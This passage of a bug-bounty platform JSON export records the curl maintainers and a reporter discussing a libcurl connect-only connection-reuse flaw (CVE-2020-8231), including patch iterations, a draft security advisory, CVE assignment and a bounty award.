now.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-03T12:47:27.263Z","updated_at":"2020-08-03T12:47:27.263Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8834860,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's a first take on a patch. Seems to no longer reproduce the problem in my tests.","markdown_message":"\u003cp\u003eHere\u0026#39;s a first take on a patch. Seems to no longer reproduce the problem in my tests.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-03T12:57:37.848Z","updated_at":"2020-08-03T12:57:37.848Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":934582,"filename":"0001-Curl_easy-remember-last-connection-by-id-not-referen.patch","type":"text/x-patch","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/euZUZNCnSy214wrG9RMgBrRP?response-content-disposition=attachment%3B%20filename%3D%220001-Curl_easy-remember-last-connection-by-id-not-referen.patch%22%3B%20filename%2A%3DUTF-8%27%270001-Curl_easy-remember-last-connection-by-id-not-referen.patch\u0026response-content-type=text%2Fx-patch\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQS4MXLS4F%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071332Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCdPyDr833HeXJwYpWjpt%2BE8j%2FssC2h5%2FlaE7mZngOMiQIhAIhVLq5AR6H%2BIAtKS0YClrr2gxSJzGl8%2FZmOeT68dbjNKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyLw4q7eiVATMCuJ5oqkQNRnoM2%2F7QfXwU%2Fz3OKzDhPBavarq1CsKnppYIDxpxowNYh40iJGbW36kruwk7Up1vRvNyltjF5q8qwhzaGeQZ%2BiAxZXfxuO%2B2Kcrl44J%2BblDlgfJxT%2FhANHqEJ52YkeCqL%2F8Jog8rViNOOl6oETOov%2FmlWe%2BSn52SY6oPYBRdYu%2BBKeiMV8Z7HXhpAE7juI1J25wS6dso8QH7RSAhNGIs8Y8svP20AF0GCUvT57CvEpTEKNmlMu6qBfLwB6pdnFPVBhYyN%2FfIE4%2FQa2wOG4EtJYFQfTQjLwttTt9CYHJbPWKgJsiqZWwvzgG5RucysYaY1Dvc5h%2B9x16jomi9UPmmxblIqy%2BUz9R8kd2FgetX%2B5J5YRu%2FIt1eM4Pmo0vWG1EERVUZkvMX57A4jS5kp%2F0ojOEF2BB5VpPswd3ts8BMSrW%2BwRyh9hJwmvOT24d%2FVDV1XlH12OfiqXYDHqfINlxhQS6ahBnjyeup6YaEdMK6oUB8ZRQCgIyT6ugHXy7R98squWf9jBVCuea8OVuecORCfgjCE76r%2FBTrqAVa%2BDcEKB0%2FoTap54OIKsextuoDcyV%2B5vaIZrhq52EXThW%2BXIbAp6mSkhzoWUgjsywl0H1o%2FDaG%2BNn3BBVN%2BRn45Quca4CUlobnDZ4s%2FQCgf9Z7bonFsVRNiD0YQAXIATjx%2FHm9NSP5TZgVxAil%2FiJbzMr5CzCPucZqQZHGinQXPFIlAHaN7P8LEs1k%2BYLHWhoCxufAjr4F07sxUlcZob%2BG%2FmA%2B1KCCNdIEo%2B%2BJY954m5YuWhqgrGS3SilW7Zv%2FcvslV9aFtJ6DgZI3AgcMDa3advxrZKKcSBi8tFdkDhjvGZZWiwX118rNoAQ%3D%3D\u0026X-Amz-Signature=06ca9998f203e60b5edcbf9d2b781e6e1997e7aafd3b3e90b3cbd1c280fc6c3d"}],"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8835176,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's my first attempt at writing an advisory for this issue.\n\n----\n\nlibcurl: wrong connect-only connection\n======================================\n\nProject curl Security Advisory, August 19th 2020 -\n[Permalink](https://curl.haxx.se/docs/CVE-2020-XXXX.html)\n\nVULNERABILITY\n-------------\n\nAn application that performs multiple requests with libcurl's multi API and\nsets the `CURLOPT_CONNECT_ONLY` option, might in rare circumstances experience\nthat when subsequently using the setup connect-only transfer, libcurl will\npick and use the wrong connection - and instead pick another one the\napplication has created since then.\n\n`CURLOPT_CONNECT_ONLY` is the option to tell libcurl to not perform an actual\ntransfer, only connect. When that operation is completed, libcurl remembers\nwhich connection it used for that transfer and \"easy handle\". It remembers the\nconnection using a pointer to the internal `connectdata` struct in memory.\n\nIf more transfers is then done with the same multi handle before the\nconnect-only connection is used, leading to the initial connect-only\nconnection to get closed (for example due to idle time-out) while also new\ntransfers (and connections) are setup, such a *new* connection might end up\ngetting the exact same memory address as the now closed connect-only\nconnection.\n\nIf after those operations, the application then wants to use the original\ntransfer's connect-only setup to for example use `curl_easy_send()` to send\nraw data over that connection, libcurl could **erroneously** find an existing\nconnection still being alive at the address it remembered since before even\nthough this is now a new and different connection.\n\nThe application could then accidentally send data over that connection which\nwasn't at all intended for that recipient, entirely unknowingly.\n\nWe are not aware of any exploit of this flaw.\n\nINFO\n----\n\nThis bug has existed at least since commit\n[c43127414d](https://github.com/curl/curl/commit/c43127414d), first shipped in\ncurl 7.29.0.\n\nThis flaw cannot trigger for users of the curl tool but only for applications\nusing libcurl and the `CURLOPT_CONNECT_ONLY` option.\n\nThe flaw only happens if the exact same memory address is re-used again for\nthe new connection as for the original connect-only connection.\n\nThe Common Vulnerabilities and Exposures (CVE) project has assigned the name\nCVE-2020-XXXX to this issue.\n\nCWE-825: Expired Pointer Dereference\n\nSeverity: Low\n\nAFFECTED VERSIONS\n-----------------\n\n- Affected versions: libcurl 7.29.0 to and including 7.71.1\n- Not affected versions: libcurl \u003c 7.29.0 and libcurl \u003e= 7.72.0\n\nTHE SOLUTION\n------------\n\nA [fix for CVE-2020-XXXX]( ... )\n\nRECOMMENDATIONS\n--------------\n\nWe suggest you take one of the following actions immediately, in order of\npreference:\n\n A - Upgrade curl to version 7.72.0\n\n B - Apply the patch on your curl version and rebuild\n\n C - Do not use `CURLOPT_CONNECT_ONLY`\n\nTIMELINE\n--------\n\nThis issue was first reported to the curl project on July 31, 2020.\n\nThis advisory was posted on August 19th 2020.\n\nCREDITS\n-------\n\nThis issue was reported by Marc Aldorasi. Patched by Daniel Stenberg.\n\nThanks a lot!\n","markdown_message":"\u003cp\u003eHere\u0026#39;s my first attempt at writing an advisory for this issue.\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003ch1 id=\"libcurl-wrong-connect-only-connection\"\u003elibcurl: wrong connect-only connection\u003c/h1\u003e\n\n\u003cp\u003eProject curl Security Advisory, August 19th 2020 -\u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fcurl.haxx.se%2Fdocs%2FCVE-2020-XXXX.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePermalink\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"vulnerability\"\u003eVULNERABILITY\u003c/h2\u003e\n\n\u003cp\u003eAn application that performs multiple requests with libcurl\u0026#39;s multi API and\u003cbr\u003e\nsets the \u003ccode\u003eCURLOPT_CONNECT_ONLY\u003c/code\u003e option, might in rare circumstances experience\u003cbr\u003e\nthat when subsequently using the setup connect-only transfer, libcurl will\u003cbr\u003e\npick and use the wrong connection - and instead pick another one the\u003cbr\u003e\napplication has created since then.\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eCURLOPT_CONNECT_ONLY\u003c/code\u003e is the option to tell libcurl to not perform an actual\u003cbr\u003e\ntransfer, only connect. When that operation is completed, libcurl remembers\u003cbr\u003e\nwhich connection it used for that transfer and \u0026quot;easy handle\u0026quot;. It remembers the\u003cbr\u003e\nconnection using a pointer to the internal \u003ccode\u003econnectdata\u003c/code\u003e struct in memory.\u003c/p\u003e\n\n\u003cp\u003eIf more transfers is then done with the same multi handle before the\u003cbr\u003e\nconnect-only connection is used, leading to the initial connect-only\u003cbr\u003e\nconnection to get closed (for example due to idle time-out) while also new\u003cbr\u003e\ntransfers (and connections) are setup, such a \u003cem\u003enew\u003c/em\u003e connection might end up\u003cbr\u003e\ngetting the exact same memory address as the now closed connect-only\u003cbr\u003e\nconnection.\u003c/p\u003e\n\n\u003cp\u003eIf after those operations, the application then wants to use the original\u003cbr\u003e\ntransfer\u0026#39;s connect-only setup to for example use \u003ccode\u003ecurl_easy_send()\u003c/code\u003e to send\u003cbr\u003e\nraw data over that connection, libcurl could \u003cstrong\u003eerroneously\u003c/strong\u003e find an existing\u003cbr\u003e\nconnection still being alive at the address it remembered since before even\u003cbr\u003e\nthough this is now a new and different connection.\u003c/p\u003e\n\n\u003cp\u003eThe application could then accidentally send data over that connection which\u003cbr\u003e\nwasn\u0026#39;t at all intended for that recipient, entirely unknowingly.\u003c/p\u003e\n\n\u003cp\u003eWe are not aware of any exploit of this flaw.\u003c/p\u003e\n\n\u003ch2 id=\"info\"\u003eINFO\u003c/h2\u003e\n\n\u003cp\u003eThis bug has existed at least since commit\u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcurl%2Fcurl%2Fcommit%2Fc43127414d\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ec43127414d\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, first shipped in\u003cbr\u003e\ncurl 7.29.0.\u003c/p\u003e\n\n\u003cp\u003eThis flaw cannot trigger for users of the curl tool but only for applications\u003cbr\u003e\nusing libcurl and the \u003ccode\u003eCURLOPT_CONNECT_ONLY\u003c/code\u003e option.\u003c/p\u003e\n\n\u003cp\u003eThe flaw only happens if the exact same memory address is re-used again for\u003cbr\u003e\nthe new connection as for the original connect-only connection.\u003c/p\u003e\n\n\u003cp\u003eThe Common Vulnerabilities and Exposures (CVE) project has assigned the name\u003cbr\u003e\nCVE-2020-XXXX to this issue.\u003c/p\u003e\n\n\u003cp\u003eCWE-825: Expired Pointer Dereference\u003c/p\u003e\n\n\u003cp\u003eSeverity: Low\u003c/p\u003e\n\n\u003ch2 id=\"affected-versions\"\u003eAFFECTED VERSIONS\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eAffected versions: libcurl 7.29.0 to and including 7.71.1\u003c/li\u003e\n\u003cli\u003eNot affected versions: libcurl \u0026lt; 7.29.0 and libcurl \u0026gt;= 7.72.0\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"the-solution\"\u003eTHE SOLUTION\u003c/h2\u003e\n\n\u003cp\u003eA \u003ca href=\"/redirect?url=http%3A%2F%2F...\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efix for CVE-2020-XXXX\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"recommendations\"\u003eRECOMMENDATIONS\u003c/h2\u003e\n\n\u003cp\u003eWe suggest you take one of the following actions immediately, in order of\u003cbr\u003e\npreference:\u003c/p\u003e\n\n\u003cp\u003eA - Upgrade curl to version 7.72.0\u003c/p\u003e\n\n\u003cp\u003eB - Apply the patch on your curl version and rebuild\u003c/p\u003e\n\n\u003cp\u003eC - Do not use \u003ccode\u003eCURLOPT_CONNECT_ONLY\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"timeline\"\u003eTIMELINE\u003c/h2\u003e\n\n\u003cp\u003eThis issue was first reported to the curl project on July 31, 2020.\u003c/p\u003e\n\n\u003cp\u003eThis advisory was posted on August 19th 2020.\u003c/p\u003e\n\n\u003ch2 id=\"credits\"\u003eCREDITS\u003c/h2\u003e\n\n\u003cp\u003eThis issue was reported by Marc Aldorasi. Patched by Daniel Stenberg.\u003c/p\u003e\n\n\u003cp\u003eThanks a lot!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-03T13:35:30.104Z","updated_at":"2020-08-03T13:35:30.104Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":934634,"filename":"CVE-2020-XXXX.md","type":"text/markdown","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/p2cvekRNgXWsESEUpiUwYae5?response-content-disposition=attachment%3B%20filename%3D%22CVE-2020-XXXX.md%22%3B%20filename%2A%3DUTF-8%27%27CVE-2020-XXXX.md\u0026response-content-type=text%2Fmarkdown\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQS4MXLS4F%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071332Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCdPyDr833HeXJwYpWjpt%2BE8j%2FssC2h5%2FlaE7mZngOMiQIhAIhVLq5AR6H%2BIAtKS0YClrr2gxSJzGl8%2FZmOeT68dbjNKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyLw4q7eiVATMCuJ5oqkQNRnoM2%2F7QfXwU%2Fz3OKzDhPBavarq1CsKnppYIDxpxowNYh40iJGbW36kruwk7Up1vRvNyltjF5q8qwhzaGeQZ%2BiAxZXfxuO%2B2Kcrl44J%2BblDlgfJxT%2FhANHqEJ52YkeCqL%2F8Jog8rViNOOl6oETOov%2FmlWe%2BSn52SY6oPYBRdYu%2BBKeiMV8Z7HXhpAE7juI1J25wS6dso8QH7RSAhNGIs8Y8svP20AF0GCUvT57CvEpTEKNmlMu6qBfLwB6pdnFPVBhYyN%2FfIE4%2FQa2wOG4EtJYFQfTQjLwttTt9CYHJbPWKgJsiqZWwvzgG5RucysYaY1Dvc5h%2B9x16jomi9UPmmxblIqy%2BUz9R8kd2FgetX%2B5J5YRu%2FIt1eM4Pmo0vWG1EERVUZkvMX57A4jS5kp%2F0ojOEF2BB5VpPswd3ts8BMSrW%2BwRyh9hJwmvOT24d%2FVDV1XlH12OfiqXYDHqfINlxhQS6ahBnjyeup6YaEdMK6oUB8ZRQCgIyT6ugHXy7R98squWf9jBVCuea8OVuecORCfgjCE76r%2FBTrqAVa%2BDcEKB0%2FoTap54OIKsextuoDcyV%2B5vaIZrhq52EXThW%2BXIbAp6mSkhzoWUgjsywl0H1o%2FDaG%2BNn3BBVN%2BRn45Quca4CUlobnDZ4s%2FQCgf9Z7bonFsVRNiD0YQAXIATjx%2FHm9NSP5TZgVxAil%2FiJbzMr5CzCPucZqQZHGinQXPFIlAHaN7P8LEs1k%2BYLHWhoCxufAjr4F07sxUlcZob%2BG%2FmA%2B1KCCNdIEo%2B%2BJY954m5YuWhqgrGS3SilW7Zv%2FcvslV9aFtJ6DgZI3AgcMDa3advxrZKKcSBi8tFdkDhjvGZZWiwX118rNoAQ%3D%3D\u0026X-Amz-Signature=5498bf23290718cad4ac0d5db714a7f8acb5e84771e49e2c1eea51c077e67248"}],"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8835396,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The problem with that is that connection ids are only unique within a single multi handle, so this issue can still occur with multiple multi handles; see the attached source file.  You could easily avoid this by just clearing that id in `curl_multi_remove_handle`.\n\nMy thought for a fix was to transfer ownership of the connection to the easy handle once its fully connected.  The connection can't be re-used, so there's no utility to having it live in the cache once its connected.  This would also address [this review comment](https://github.com/curl/curl/pull/5749/files#r463297264), since we wouldn't need to look for the connection if we had direct ownership of it, and there would be similar improvements in `curl_easy_recv` and `curl_easy_send`.  That might be too big of a change for something we want people to be able to backport though.","markdown_message":"\u003cp\u003eThe problem with that is that connection ids are only unique within a single multi handle, so this issue can still occur with multiple multi handles; see the attached source file.  You could easily avoid this by just clearing that id in \u003ccode\u003ecurl_multi_remove_handle\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eMy thought for a fix was to transfer ownership of the connection to the easy handle once its fully connected.  The connection can\u0026#39;t be re-used, so there\u0026#39;s no utility to having it live in the cache once its connected.  This would also address \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcurl%2Fcurl%2Fpull%2F5749%2Ffiles%23r463297264\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethis review comment\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, since we wouldn\u0026#39;t need to look for the connection if we had direct ownership of it, and there would be similar improvements in \u003ccode\u003ecurl_easy_recv\u003c/code\u003e and \u003ccode\u003ecurl_easy_send\u003c/code\u003e.  That might be too big of a change for something we want people to be able to backport though.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-03T14:03:08.469Z","updated_at":"2020-08-03T14:03:08.469Z","actor":{"username":"m42a","cleared":false,"url":"/m42a","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":934643,"filename":"curl-reuse.cpp","type":"text/x-c++src","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/v6kr92uYUWsUGevT946joujU?response-content-disposition=attachment%3B%20filename%3D%22curl-reuse.cpp%22%3B%20filename%2A%3DUTF-8%27%27curl-reuse.cpp\u0026response-content-type=text%2Fx-c%2B%2Bsrc\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQS4MXLS4F%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071332Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCdPyDr833HeXJwYpWjpt%2BE8j%2FssC2h5%2FlaE7mZngOMiQIhAIhVLq5AR6H%2BIAtKS0YClrr2gxSJzGl8%2FZmOeT68dbjNKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyLw4q7eiVATMCuJ5oqkQNRnoM2%2F7QfXwU%2Fz3OKzDhPBavarq1CsKnppYIDxpxowNYh40iJGbW36kruwk7Up1vRvNyltjF5q8qwhzaGeQZ%2BiAxZXfxuO%2B2Kcrl44J%2BblDlgfJxT%2FhANHqEJ52YkeCqL%2F8Jog8rViNOOl6oETOov%2FmlWe%2BSn52SY6oPYBRdYu%2BBKeiMV8Z7HXhpAE7juI1J25wS6dso8QH7RSAhNGIs8Y8svP20AF0GCUvT57CvEpTEKNmlMu6qBfLwB6pdnFPVBhYyN%2FfIE4%2FQa2wOG4EtJYFQfTQjLwttTt9CYHJbPWKgJsiqZWwvzgG5RucysYaY1Dvc5h%2B9x16jomi9UPmmxblIqy%2BUz9R8kd2FgetX%2B5J5YRu%2FIt1eM4Pmo0vWG1EERVUZkvMX57A4jS5kp%2F0ojOEF2BB5VpPswd3ts8BMSrW%2BwRyh9hJwmvOT24d%2FVDV1XlH12OfiqXYDHqfINlxhQS6ahBnjyeup6YaEdMK6oUB8ZRQCgIyT6ugHXy7R98squWf9jBVCuea8OVuecORCfgjCE76r%2FBTrqAVa%2BDcEKB0%2FoTap54OIKsextuoDcyV%2B5vaIZrhq52EXThW%2BXIbAp6mSkhzoWUgjsywl0H1o%2FDaG%2BNn3BBVN%2BRn45Quca4CUlobnDZ4s%2FQCgf9Z7bonFsVRNiD0YQAXIATjx%2FHm9NSP5TZgVxAil%2FiJbzMr5CzCPucZqQZHGinQXPFIlAHaN7P8LEs1k%2BYLHWhoCxufAjr4F07sxUlcZob%2BG%2FmA%2B1KCCNdIEo%2B%2BJY954m5YuWhqgrGS3SilW7Zv%2FcvslV9aFtJ6DgZI3AgcMDa3advxrZKKcSBi8tFdkDhjvGZZWiwX118rNoAQ%3D%3D\u0026X-Amz-Signature=7d0c4275b88e9db8998e60d0b70358eb255ef82ef46a9ff2b5437efc58f018be"}],"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8835512,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e You could easily avoid this by just clearing that id in curl_multi_remove_handle.\n\nRight, when the easy handle is removed from the multi it should be cleared. I'll amend my patch. It should probably also be cleared in add_handle.\n\n\u003e My thought for a fix was to transfer ownership of the connection to the easy handle once its fully connected.\n\nThat would be a rather big change though as we have no such connection handling now, and \"normal\" connections should not be moved there so it would need to be specific for connect-only ones.\n\nBut sure, it would also solve a few issues so maybe we should work on doing that after we land this fix so that we can keep the actual security fix rather simple?","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eYou could easily avoid this by just clearing that id in curl_multi_remove_handle.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eRight, when the easy handle is removed from the multi it should be cleared. I\u0026#39;ll amend my patch. It should probably also be cleared in add_handle.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eMy thought for a fix was to transfer ownership of the connection to the easy handle once its fully connected.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThat would be a rather big change though as we have no such connection handling now, and \u0026quot;normal\u0026quot; connections should not be moved there so it would need to be specific for connect-only ones.\u003c/p\u003e\n\n\u003cp\u003eBut sure, it would also solve a few issues so maybe we should work on doing that after we land this fix so that we can keep the actual security fix rather simple?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-03T14:18:04.100Z","updated_at":"2020-08-03T14:18:04.100Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8835518,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"~~patch v2~~","markdown_message":"\u003cp\u003e\u003cdel\u003epatch v2\u003c/del\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-03T14:18:46.552Z","updated_at":"2020-08-03T14:20:54.213Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8835526,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Simple mistake. v3!","markdown_message":"\u003cp\u003eSimple mistake. v3!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-03T14:20:02.621Z","updated_at":"2020-08-03T14:20:02.621Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":934672,"filename":"v3-0001-Curl_easy-remember-last-connection-by-id-not-refe.patch","type":"text/x-patch","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/BDNFbioeiKioyUFzkEmGTnQs?response-content-disposition=attachment%3B%20filename%3D%22v3-0001-Curl_easy-remember-last-connection-by-id-not-refe.patch%22%3B%20filename%2A%3DUTF-8%27%27v3-0001-Curl_easy-remember-last-connection-by-id-not-refe.patch\u0026response-content-type=text%2Fx-patch\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQS4MXLS4F%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071332Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCdPyDr833HeXJwYpWjpt%2BE8j%2FssC2h5%2FlaE7mZngOMiQIhAIhVLq5AR6H%2BIAtKS0YClrr2gxSJzGl8%2FZmOeT68dbjNKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyLw4q7eiVATMCuJ5oqkQNRnoM2%2F7QfXwU%2Fz3OKzDhPBavarq1CsKnppYIDxpxowNYh40iJGbW36kruwk7Up1vRvNyltjF5q8qwhzaGeQZ%2BiAxZXfxuO%2B2Kcrl44J%2BblDlgfJxT%2FhANHqEJ52YkeCqL%2F8Jog8rViNOOl6oETOov%2FmlWe%2BSn52SY6oPYBRdYu%2BBKeiMV8Z7HXhpAE7juI1J25wS6dso8QH7RSAhNGIs8Y8svP20AF0GCUvT57CvEpTEKNmlMu6qBfLwB6pdnFPVBhYyN%2FfIE4%2FQa2wOG4EtJYFQfTQjLwttTt9CYHJbPWKgJsiqZWwvzgG5RucysYaY1Dvc5h%2B9x16jomi9UPmmxblIqy%2BUz9R8kd2FgetX%2B5J5YRu%2FIt1eM4Pmo0vWG1EERVUZkvMX57A4jS5kp%2F0ojOEF2BB5VpPswd3ts8BMSrW%2BwRyh9hJwmvOT24d%2FVDV1XlH12OfiqXYDHqfINlxhQS6ahBnjyeup6YaEdMK6oUB8ZRQCgIyT6ugHXy7R98squWf9jBVCuea8OVuecORCfgjCE76r%2FBTrqAVa%2BDcEKB0%2FoTap54OIKsextuoDcyV%2B5vaIZrhq52EXThW%2BXIbAp6mSkhzoWUgjsywl0H1o%2FDaG%2BNn3BBVN%2BRn45Quca4CUlobnDZ4s%2FQCgf9Z7bonFsVRNiD0YQAXIATjx%2FHm9NSP5TZgVxAil%2FiJbzMr5CzCPucZqQZHGinQXPFIlAHaN7P8LEs1k%2BYLHWhoCxufAjr4F07sxUlcZob%2BG%2FmA%2B1KCCNdIEo%2B%2BJY954m5YuWhqgrGS3SilW7Zv%2FcvslV9aFtJ6DgZI3AgcMDa3advxrZKKcSBi8tFdkDhjvGZZWiwX118rNoAQ%3D%3D\u0026X-Amz-Signature=8993c276bddcfac81226a5dccd12a3f06be487f62c950b01035c25ab44b77ae4"}],"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8870017,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-06T22:37:03.912Z","updated_at":"2020-08-06T22:37:03.912Z","cve_ids":["CVE-2020-8231"],"actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8870019,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is CVE-2020-8231","markdown_message":"\u003cp\u003eThis is CVE-2020-8231\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-06T22:37:23.132Z","updated_at":"2020-08-06T22:37:23.132Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8872255,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"The curl security team has decided to reward hacker @m42a  with the amount of 500 USD for finding and reporting this issue. Many thanks for your great work!","markdown_message":"\u003cp\u003eThe curl security team has decided to reward hacker \u003ca href=\"/m42a\"\u003e@m42a\u003c/a\u003e  with the amount of 500 USD for finding and reporting this issue. Many thanks for your great 